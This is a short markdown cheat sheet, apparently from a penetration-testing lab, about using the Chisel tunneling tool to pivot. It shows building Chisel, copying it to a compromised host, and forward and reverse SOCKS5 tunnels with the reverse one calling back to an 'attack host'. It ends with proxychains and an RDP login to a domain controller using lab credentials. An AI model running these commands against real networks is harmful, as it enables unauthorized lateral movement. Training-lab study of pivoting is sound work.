# Content
- [Chisel](#chisel)
- [Chisel Pivot](#chisel-pivot)
- [Chisel Reverse Pivot](#chisel-reverse-pivot)

# Chisel
- [chisel](https://github.com/jpillora/chisel)
- Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH.
- Chisel can create a client-server tunnel connection in a firewall restricted environment.


## Chisel Pivot
### Setting Up & Using Chisel
```shell
$ go install github.com/jpillora/chisel@latest

# or

$ git clone https://github.com/jpillora/chisel.git
$ cd chisel
$ go build
## shrinking the size of the binary
$ go build -ldflags="-s -w"
$ upx brute chisel 
```

### Transferring Chisel Binary to Pivot Host
```shell
$ scp chisel ubuntu@10.129.202.64:~/
```
### Running the Chisel Server on the Pivot Host
```shell
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5


2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

### Connecting to the Chisel Server
```shell
$ ./chisel client -v 10.129.202.64:1234 socks
```

### Editing & Confirming proxychains.conf

```shell
$ tail -f /etc/proxychains.conf 

# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

### Pivoting to the DC
```shell
$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Chisel Reverse Pivot

### Starting the Chisel Server on our Attack Host
```shell
$ sudo ./chisel server --reverse -v -p 1234 --socks5
```

### Connecting the Chisel Client to our Attack Host

```shell
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
```

### Editing & Confirming proxychains.conf
```shell
$ tail -f /etc/proxychains.conf 

# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

### Pivoting to the DC
```shell
$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
